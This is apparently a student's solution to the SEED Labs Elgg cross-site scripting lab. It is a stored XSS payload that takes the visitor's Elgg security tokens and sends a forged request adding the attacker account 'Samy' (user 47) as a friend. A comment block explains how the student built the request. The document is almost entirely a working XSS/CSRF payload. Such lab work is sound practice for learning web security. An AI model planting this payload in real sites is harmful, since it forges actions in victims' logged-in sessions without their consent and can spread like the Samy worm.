<script type="text/javascript">
	window.onload = function () {
		
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.

		//step 1 and 2
		var sendurl="/action/friends/add?friend=47"+ts+token; //FILL IN


		//Create and send Ajax request to add friend
		///step 3
		if (elgg.session.user.guid != 47) {
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();
		}
	}
</script>

/*		****STEPS******
	1. I inspected the source, when the "Add friend" button was pressed to find the url.
	2. Having gotten the url structure, the sendurl variable was reconstructed using str cat, using ts and token fron elgg.
	3. The userId of currently logged in user was found out also by inspecting source from elgg as guid and a condition was set to prevent samy from adding himself as a friend.
*/
